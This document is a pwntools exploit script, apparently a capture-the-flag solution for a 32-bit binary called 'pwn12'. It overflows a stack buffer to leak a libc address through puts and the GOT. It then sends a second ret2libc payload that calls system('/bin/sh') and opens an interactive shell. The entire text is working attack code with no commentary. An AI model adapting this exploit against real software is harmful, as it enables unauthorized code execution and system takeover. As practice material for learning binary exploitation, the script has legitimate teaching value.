from pwn import *
context.log_level = 'debug'
p = process("./pwn12")
e = ELF("./pwn12")
libc = ELF("/libc32.so")
p.recv()
p.sendline("mask")
for i in range(2):
    p.recv()
    p.sendline("2")

for i in range(6):
    p.recv()
    p.sendline("3")

p.recv()
payload = 'a'*0x24+'bbbb'
payload += p32(e.plt['puts'])+p32(0x080486E0)
payload += p32(e.got['puts'])
p.sendline(payload)
libc.address = u32(p.recv(4))-libc.symbols['puts']

for i in range(2):
    p.recv()
    p.sendline("2")

for i in range(6):
    p.recv()
    p.sendline("3")

p.recv()
payload = 'a'*0x24+'bbbb'
payload += p32(libc.symbols['system'])+p32(next(libc.search("/bin/sh")))*2
p.sendline(payload)
p.interactive()
